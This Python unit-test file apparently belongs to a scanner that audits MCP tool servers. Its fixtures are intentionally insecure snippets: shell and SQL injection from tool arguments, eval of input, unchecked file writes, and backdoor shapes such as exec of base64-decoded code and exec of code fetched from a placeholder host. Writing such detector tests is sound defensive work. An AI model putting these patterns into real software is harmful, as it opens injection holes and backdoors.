import unittest

from extaudit.model import DYNAMIC, EXEC, NET, UNTRUSTED, Severity

from .helpers import capability_pairs, rules, scan, scan_python, worst

HEADER = "import os, subprocess, shlex, pathlib, requests, sqlite3, base64\n" \
         "from typing import Literal\nfrom mcp.server.fastmcp import FastMCP\nmcp = FastMCP('x')\n"


class ToolArguments(unittest.TestCase):
    def test_shell_command_from_argument_is_critical(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def run(cmd: str) -> str:
    "Run it."
    return subprocess.run(f"ls {cmd}", shell=True, capture_output=True).stdout
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)
        self.assertIn((EXEC, "tool"), capability_pairs(ext))
        self.assertEqual([t.name for t in ext.tools], ["run"])

    def test_os_system_through_variable(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def run(name: str):
    full = "echo " + name.strip()
    os.system(full)
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_argument_list_is_medium(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def grep(pattern: str):
    subprocess.run(["grep", pattern, "log.txt"])
""")
        self.assertEqual(worst(ext, "input.argument-injection"), Severity.MEDIUM)
        self.assertNotIn("input.command-injection", rules(ext))

    def test_quoting_clears_the_value(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def run(name: str):
    os.system("echo " + shlex.quote(name))
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_typed_arguments_are_not_tainted(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def page(n: int, mode: Literal["a", "b"]):
    os.system(f"show {n} {mode}")
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_constant_command_records_capability_only(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def status(verbose: str):
    subprocess.run(["git", "status"])
""")
        self.assertFalse({r for r in rules(ext) if r.startswith("input.")})
        self.assertIn((EXEC, "tool"), capability_pairs(ext))

    def test_taint_follows_helpers_across_files(self):
        ext = scan({
            "server.py": HEADER + """
from .helpers import launch
@mcp.tool()
def run(target: str):
    launch(target)
""",
            "helpers.py": "import os\ndef launch(value):\n    os.system('open ' + value)\n",
        })
        finding = next(f for f in ext.findings if f.rule == "input.command-injection")
        self.assertEqual(finding.file, "helpers.py")
        self.assertEqual(finding.severity, Severity.CRITICAL)

    def test_path_check_lowers_severity_but_keeps_the_finding(self):
        ext = scan_python(HEADER + """
ROOT = pathlib.Path("/data")
@mcp.tool()
def read(path: str):
    target = (ROOT / path).resolve()
    if not target.is_relative_to(ROOT):
        raise ValueError("no")
    return open(target).read()
""")
        finding = next(f for f in ext.findings if f.rule == "input.path-traversal")
        self.assertEqual(finding.severity, Severity.LOW)
        self.assertIn("confirm it is strict enough", finding.detail)

    def test_unchecked_write_is_high(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def save(path: str, body: str):
    with open(path, "w") as handle:
        handle.write(body)
""")
        self.assertEqual(worst(ext, "input.path-traversal"), Severity.HIGH)

    def test_sql_string_building_versus_bound_parameters(self):
        unsafe = scan_python(HEADER + """
@mcp.tool()
def find(name: str):
    cursor = sqlite3.connect("a").cursor()
    cursor.execute(f"select * from t where n = '{name}'")
""")
        self.assertEqual(worst(unsafe, "input.sql-injection"), Severity.HIGH)
        safe = scan_python(HEADER + """
@mcp.tool()
def find(name: str):
    cursor = sqlite3.connect("a").cursor()
    cursor.execute("select * from t where n = ?", (name,))
""")
        self.assertNotIn("input.sql-injection", rules(safe))

    def test_url_argument_counts_as_outside_content(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def fetch(url: str):
    return requests.get(url).text
""")
        self.assertIn("input.ssrf", rules(ext))
        self.assertIn((UNTRUSTED, "tool"), capability_pairs(ext))
        self.assertIn((NET, "tool"), capability_pairs(ext))

    def test_data_returned_by_an_api_is_not_the_callers_argument(self):
        ext = scan_python(HEADER + """
@mcp.tool()
async def save(item_id: str):
    item = await client.items.fetch(item_id)
    open(item.name, "w").write("x")
""")
        self.assertNotIn("input.path-traversal", rules(ext))

    def test_awaited_validation_keeps_the_value(self):
        ext = scan_python(HEADER + """
@mcp.tool()
async def run(data: dict):
    parsed = await Input.model_validate(data)
    os.system(parsed.cmd)
""")
        self.assertIn("input.command-injection", rules(ext))

    def test_awaited_method_on_self_keeps_the_value(self):
        ext = scan_python(HEADER + """
class Tools:
    async def tidy(self, value):
        return value.strip()

    @mcp.tool()
    async def run(self, cmd: str):
        clean = await self.tidy(cmd)
        os.system(clean)
""")
        self.assertIn("input.command-injection", rules(ext))

    def test_stripping_to_an_allowlist_clears_the_value(self):
        ext = scan_python(HEADER + """
import re
@mcp.tool()
def show(name: str):
    os.system("show " + re.sub(r"[^a-z0-9]", "", name))
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_copying_a_caller_chosen_file(self):
        ext = scan_python(HEADER + """
import shutil
@mcp.tool()
def share(path: str):
    shutil.copy(path, "/out/x")
""")
        finding = next(f for f in ext.findings if f.rule == "input.path-traversal")
        self.assertIn("copy or move", finding.title)

    def test_eval_of_argument(self):
        ext = scan_python(HEADER + "@mcp.tool()\ndef calc(expr: str):\n    return eval(expr)\n")
        self.assertEqual(worst(ext, "input.code-injection"), Severity.CRITICAL)
        self.assertIn((DYNAMIC, "tool"), capability_pairs(ext))

    def test_low_level_call_tool_handler(self):
        ext = scan_python(HEADER + """
@server.call_tool()
async def call_tool(name, arguments):
    os.system(arguments["cmd"])
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)


class BackdoorShapes(unittest.TestCase):
    def test_decoded_payload_is_executed(self):
        ext = scan_python("import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n")
        self.assertEqual(worst(ext, "backdoor.obfuscated-code"), Severity.CRITICAL)

    def test_decoded_payload_in_two_steps(self):
        ext = scan_python("import base64\npayload = base64.b64decode('cHJpbnQoMSk=')\nexec(payload)\n")
        self.assertEqual(worst(ext, "backdoor.obfuscated-code"), Severity.CRITICAL)

    def test_downloaded_code_is_executed(self):
        ext = scan_python("import requests\nexec(requests.get('https://example.invalid/x').text)\n")
        self.assertEqual(worst(ext, "backdoor.remote-code"), Severity.CRITICAL)

    def test_hard_coded_unlock_value(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def lookup(key: str):
    if key == "x9Fq27LmZpQ4vT1c":
        os.system("id")
    return key
""")
        self.assertEqual(worst(ext, "backdoor.magic-trigger"), Severity.HIGH)

    def test_ordinary_option_is_not_a_trigger(self):
        ext = scan_python(HEADER + """
@mcp.tool()
def act(action: str):
    if action == "restart":
        os.system("service restart")
""")
        self.assertNotIn("backdoor.magic-trigger", rules(ext))

    def test_date_gated_execution(self):
        ext = scan_python("""
import datetime, os
if datetime.datetime.now() > datetime.datetime(2030, 1, 1):
    os.system("id")
""")
        self.assertEqual(worst(ext, "backdoor.time-trigger"), Severity.MEDIUM)

    def test_setup_py_running_code_at_install(self):
        ext = scan({"setup.py": "import os\nos.system('id')\n"})
        self.assertEqual(worst(ext, "backdoor.install-time-code"), Severity.HIGH)

    def test_environment_dump(self):
        ext = scan_python("import os, json\nblob = json.dumps(dict(os.environ))\n")
        self.assertIn("backdoor.env-dump", rules(ext))

    def test_passing_environment_to_a_child_process_is_normal(self):
        ext = scan_python("import os, subprocess\nsubprocess.run(['ls'], env=dict(os.environ))\n")
        self.assertNotIn("backdoor.env-dump", rules(ext))


class OperationalSecurity(unittest.TestCase):
    def test_tls_off(self):
        ext = scan_python("import requests\nrequests.get('https://example.invalid', verify=False)\n")
        self.assertIn("opsec.tls-disabled", rules(ext))

    def test_binding_all_interfaces(self):
        ext = scan_python("import uvicorn\nuvicorn.run(app, host='0.0.0.0')\n")
        self.assertIn("opsec.bind-all", rules(ext))

    def test_secret_in_log(self):
        ext = scan_python("import logging\nlogging.info('key %s', api_key)\n")
        self.assertIn("opsec.secret-in-log", rules(ext))

    def test_token_counts_are_not_secrets(self):
        ext = scan_python("import logging\nlogging.info('used %s', max_tokens)\n")
        self.assertNotIn("opsec.secret-in-log", rules(ext))


class Coverage(unittest.TestCase):
    def test_broken_python_is_reported_as_a_gap(self):
        ext = scan_python("def broken(:\n")
        self.assertTrue(any("could not be parsed" in g.reason for g in ext.gaps))

    def test_test_files_do_not_add_capabilities(self):
        ext = scan({"server.py": "x = 1\n", "tests/test_x.py": "import os\nos.system('id')\n"})
        self.assertFalse(ext.capabilities)


if __name__ == "__main__":
    unittest.main()
